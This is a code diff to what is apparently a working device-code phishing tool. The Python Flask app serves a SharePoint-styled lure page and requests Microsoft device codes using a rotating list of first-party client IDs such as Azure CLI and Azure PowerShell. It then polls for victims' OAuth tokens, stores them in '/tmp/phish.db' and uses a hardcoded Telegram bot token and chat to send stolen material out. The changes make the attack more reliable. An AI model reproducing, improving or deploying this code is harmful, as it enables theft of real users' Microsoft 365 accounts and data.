@@ -13,21 +13,15 @@ TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
-CLIENT_IDS = [
-    'fb78d390-0c51-40cd-8e17-fdbfab77341b',  # Exchange REST API Based PowerShell
-    '00b41c95-dab0-4487-9791-b9d2c32c80f2',  # Office 365 Management
-    '1fec8e78-bce4-4aaf-ab1b-5451cc387264',  # Microsoft Teams
-    'd3590ed6-52b3-4102-aeff-aad2292ab01c',  # Microsoft Office
-    '57336123-6e14-4ebb-8dc2-6cec24c827f9',  # Whiteboard
-    '22098786-6e16-43cc-a27d-191a01a1e3b5',  # Teams (secondary FOCI)
-    '4813382a-8fa7-425e-ab75-3b753aab3abb',  # Microsoft Authenticator
-    '04b07795-8ddb-461a-bbee-02f9e1bf7b46',  # Azure CLI
-    '1950a258-227b-4e31-a9cf-717495945fc2',  # Azure PowerShell
-    '27922004-5251-4030-b22d-91ecd9a37ea4',  # Outlook Mobile
-    'ab9b8c07-8f02-4f72-87fa-80105867a763',  # OneDrive SyncEngine
-    'b26aadf8-566f-4478-926f-589f601d9c74',  # Teams web
-]
+CID_LOCK = threading.Lock()
 CLIENT_ID_INDEX = 0
+
+CLIENT_IDS = [
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Microsoft Azure PowerShell (Alt)
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Microsoft Azure CLI
+    "844cca35-0656-46ce-9655-e597c06d2d1d",  # Microsoft Azure Storage Explorer
+    "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
+]
 
 # .default avoids AADSTS65002 — no per-resource scope preauthorization needed
 DEVICE_CODE_SCOPE = "https://graph.microsoft.com/.default offline_access openid profile"
@@ -115,25 +109,41 @@ def send_telegram_file(filename, content, caption=""):
 
 # ---------- Device code flow ----------
 def request_device_code():
+    """Returns (client_id, data, error). Exactly one of data/error is set."""
     global CLIENT_ID_INDEX
+    last_error = None
+
     for _ in range(len(CLIENT_IDS)):
-        client_id = CLIENT_IDS[CLIENT_ID_INDEX]
+        with CID_LOCK:
+            client_id = CLIENT_IDS[CLIENT_ID_INDEX]
+
+        url = f"{UPSTREAM}/common/oauth2/v2.0/devicecode"
+        payload = {
+            "client_id": client_id,
+            "scope": DEVICE_CODE_SCOPE,
+        }
+
         try:
-            resp = requests.post(
-                f"{UPSTREAM}/organizations/oauth2/v2.0/devicecode",
-                data={"client_id": client_id, "scope": DEVICE_CODE_SCOPE},
-                timeout=20
-            )
+            resp = requests.post(url, data=payload, timeout=10)
             data = resp.json()
-            if resp.status_code == 200 and "device_code" in data:
-                return client_id, data
-            else:
-                print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
-                CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
+
+            if "error" in data:
+                if data.get("error") in ["unauthorized_client", "invalid_client", "AADSTS65002"]:
+                    with CID_LOCK:
+                        CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
+                    last_error = data.get("error_description", "Unknown error")
+                    continue
+                return client_id, None, data.get("error_description", str(data))
+
+            return client_id, data, None
+
         except Exception as e:
-            print(f"[SESSION] client_id {client_id} exception: {e}")
-            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
-    return None, None
+            with CID_LOCK:
+                CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
+            last_error = str(e)
+            continue
+
+    return None, None, f"All client IDs failed. Last error: {last_error}"
 
 def decode_id_token(id_token):
     try:
@@ -156,7 +166,7 @@ def poll_worker():
                     continue
                 try:
                     resp = requests.post(
-                        f"{UPSTREAM}/organizations/oauth2/v2.0/token",
+                        f"{UPSTREAM}/common/oauth2/v2.0/token",
                         data={
                             "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                             "client_id": client_id,
@@ -220,7 +230,7 @@ def _shutdown(sig, frame):
 signal.signal(signal.SIGTERM, _shutdown)
 signal.signal(signal.SIGINT, _shutdown)
 
-# ---------- Page (SharePoint style, unchanged) ----------
+# ---------- Page (SharePoint style) ----------
 def render_page(user_code, verify_url):
     return f"""<!DOCTYPE html>
 <html lang="en">
@@ -352,14 +362,15 @@ function go() {{
 # ---------- Routes ----------
 @app.route("/", methods=["GET"])
 def home():
-    client_id, data = request_device_code()
+    client_id, data, err = request_device_code()
     if not data:
+        print(f"[SESSION] device code failed: {err}")
         return "<h2>Service temporarily unavailable, please retry.</h2>", 503
     sid = db_add_session(
         data["device_code"], data["user_code"], client_id,
         data.get("interval", 5), time.time() + int(data.get("expires_in", 900))
     )
-    print(f"[SESSION] new session {sid} user_code={data['user_code']}")
+    print(f"[SESSION] new session {sid} user_code={data['user_code']} cid={client_id[:8]}")
     return Response(render_page(data["user_code"], data["verification_uri"]), mimetype="text/html")
 
 @app.route("/test_tg", methods=["GET"])
